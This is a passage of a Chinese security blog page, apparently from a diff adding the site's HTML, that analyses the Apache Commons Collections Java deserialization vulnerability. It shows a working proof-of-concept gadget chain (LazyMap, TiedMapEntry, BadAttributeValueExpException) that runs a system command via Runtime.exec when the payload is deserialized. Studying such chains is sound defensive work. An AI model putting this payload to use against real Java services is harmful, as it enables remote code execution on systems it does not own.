class="line">//https://joychou.org/java/commons-collections-java-deserialize-vulnerability-analysis.html</span><br><span class="line">public class DeserializePayload2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;, new Object[] &#123;&quot;calc&quot;&#125;),</span><br><span class="line">                new ConstantTransformer(&quot;1&quot;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformChain);</span><br><span class="line">        TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;lltest&quot;);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException exception = new BadAttributeValueExpException(null);</span><br><span class="line">        Field valField = exception.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">        valField.setAccessible(true);</span><br><span class="line">        valField.set(exception, entry);</span><br><span class="line">         </span><br><span class="line">        //序列化生成payload</span><br><span class="line">        File f = new File(&quot;tmp/payload2.ser&quot;);</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));</span><br><span class="line">        out.writeObject(exception);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        System.out.println(&quot;生成payload 位于tmp/payload2.ser&quot;);</span><br><span class="line"></span><br><span class="line">       //模拟反序列化  触发漏洞</span><br><span class="line">        ObjectInputStream in = new ObjectInputStream(new FileInputStream(&quot;tmp/payload2.ser&quot;));</span><br><span class="line">        in.readObject();  // 触发漏洞</span><br><span class="line">        in.close();</span><br><span class="line">        System.out.println(&quot;反序列化tmp/payload2.ser 触发漏洞&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/Commons-Collections-JAVA-Unserialize-55.png" alt=""></p>
+<p><strong>参考:</strong><br><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" target="_blank" rel="noopener">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a><br><a href="https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles" target="_blank" rel="noopener">https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles</a><br><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/" target="_blank" rel="noopener">https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/</a><br><a href="https://www.anquanke.com/post/id/82934" target="_blank" rel="noopener">https://www.anquanke.com/post/id/82934</a><br><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a> </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/" rel="next" title="InstallUtil&csc.exe-bypass application whitelisting">
+                <i class="fa fa-chevron-left"></i> InstallUtil&csc.exe-bypass application whitelisting
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/ppl.jpg" alt="pplsec">
+            
+              <p class="site-author-name" itemprop="name">pplsec</p>
+              <p class="site-description motion-element" itemprop="description">渗透测试 应急响应 代码审计</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一-Commons-Collections漏洞简介"><span class="nav-text">(一)    Commons Collections漏洞简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二-InvokerTransformer类的transform-方法"><span class="nav-text">(二)    InvokerTransformer类的transform()方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三-找谁调用InvokerTransformer的transform"><span class="nav-text">(三)    找谁调用InvokerTransformer的transform</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四-TransformedMap分析"><span class="nav-text">(四)    TransformedMap分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-TransformedMap调用了transform"><span class="nav-text">1)    TransformedMap调用了transform</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-利用反射本地执行命令POC"><span class="nav-text">2)    利用反射本地执行命令POC</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#TransformTest2-java"><span class="nav-text">TransformTest2.java</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-找readObject-中调用MapEntry类的setValue-方法"><span class="nav-text">3)    找readObject()中调用MapEntry类的setValue()方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-结合反序列化实现远程命令执行POC"><span class="nav-text">4)    结合反序列化实现远程命令执行POC</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#DeserializePayload1-java-TransformedMap"><span class="nav-text">DeserializePayload1.java(TransformedMap)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#五-LazyMap分析"><span class="nav-text">(五)    LazyMap分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-LazyMap方法调用了transform方法"><span class="nav-text">1)    LazyMap方法调用了transform方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-找readObject-中调用LazyMap的get-方法"><span class="nav-text">2)    找readObject()中调用LazyMap的get()方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-结合反序列化实现远程命令执行POC"><span class="nav-text">3)    结合反序列化实现远程命令执行POC</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#DeserializePayload2-java-LazyMap"><span class="nav-text">DeserializePayload2.java (LazyMap)</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">pplsec</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
